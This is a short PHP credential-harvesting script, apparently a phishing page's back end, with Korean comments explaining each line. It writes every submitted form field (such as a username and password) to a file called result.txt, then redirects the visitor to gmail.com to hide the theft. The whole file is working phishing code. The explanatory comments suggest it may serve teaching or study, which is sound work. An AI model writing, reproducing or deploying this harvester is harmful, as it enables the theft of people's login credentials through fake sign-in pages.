<?php
# 로그인 후 Refresh할 사이트 경로
header ('Location:http://www.gmail.com/');
# result.txt에 파일을 읽기/쓰기한다. a:result.txt 파일이 존재할 경우 파일 끝에 추가/ 없을 경우 생성
$handle = fopen("result.txt", "a");
# foreach는 for과 유사한 형태로 입력받은 배열의 항목을 기준으로 반복실행
# $_POST: 배열명 as $variable: 키 변수(데이터를 저장하기위한 그릇) => $value: 값 변수
foreach($_POST as $variable => $value)
# fwrite는 파일에 데이터를 쓰기 위한 함수, result.txt에 "variable(매개변수)=입력 한 값"
# \r\n은 username=guleum 형식으로 한번 끝났을때 줄바꿈 처리를 위한것
{ fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); }
# fclose는 열린 파일을 닫아주는 함수
fwrite($handle, "\r\n"); fclose($handle); exit;
?>

